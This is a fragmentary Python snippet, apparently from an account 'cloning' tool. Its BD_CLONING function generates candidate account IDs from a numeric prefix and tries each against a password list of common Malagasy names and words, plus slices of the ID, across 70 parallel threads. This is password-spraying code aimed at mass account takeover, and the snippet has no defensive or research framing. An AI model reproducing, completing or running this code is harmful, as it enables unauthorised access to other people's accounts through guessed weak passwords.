...
def BD_CLONING():
    ...
    with tred(max_workers=70) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],'malala','sarika','mahandry','ravaka','faniry','finaritra','mamako','papako','nirina','felana','sambatra','solofo','mamiko','safidy','koloina','mahery','vadiko','fitiavana','valimbavaka','zanako','fitiavako','fanilo','anjarako','saholy','salohy','lalaina','tsilavina','tahina','anjara','nilaina','fanasina','hasina','jesosy','dadako','badoda','heritina','nomena','fandresena','finoana','fiderana','nantenaina','harena','tahiry','valisoa','tantely','tanjona','sarika','fanasina','felana','malalako','fanasina','mahery','seheno','santatra','Santatra','nilaina','Nilaina','tolotra','sitraka','antananarivo','badoda','fitiavako','mihary']
